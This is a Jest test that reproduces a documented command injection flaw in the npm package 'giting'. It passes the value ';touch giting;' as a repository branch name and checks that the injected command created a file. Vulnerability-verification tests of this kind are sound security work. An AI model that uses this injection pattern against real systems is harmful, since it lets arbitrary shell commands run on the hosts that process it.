//https://snyk.io/vuln/SNYK-JS-GITING-559008
test("Command Injection in giting", () => {
  const Test = require("giting");
  const fs = require("fs");
  const path = "./giting";
  const sleep = require("sleep");
  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let injection_command = ";touch giting;";
  test = new Test({ workDir: "./" });
  repo = {
    organization: "./",
    name: "./",
    branch: injection_command,
  };
  test.pull(repo, function () {});
  sleep.sleep(5);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
